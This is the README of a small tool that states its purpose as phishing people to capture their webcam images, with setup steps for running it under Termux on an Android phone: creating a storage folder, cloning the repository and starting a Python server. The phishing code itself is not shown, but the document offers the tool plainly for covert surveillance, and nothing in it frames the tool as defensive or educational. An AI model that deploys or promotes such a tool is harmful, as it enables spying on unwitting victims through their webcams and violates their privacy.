# cam

This is a simple tool that lets you use phishing methods to grab someone's webcam images.

## Usage

To use this tool, follow these steps:

1. **Create a folder on your phone's internal storage**:
   - Create a folder named `hack-pic` or modify `upload.php` to change `/sdcard/hack-pic/photo_` to `/uploads/photo_` to save pictures in the Termux folder.

2. **Storing in Device Internal Storage**:
   ```sh
   cd /sdcard
   mkdir hack-pic
   git clone https://github.com/prasanneyy/cam
   cd cam
   chmod +x *
   python3 server.py 
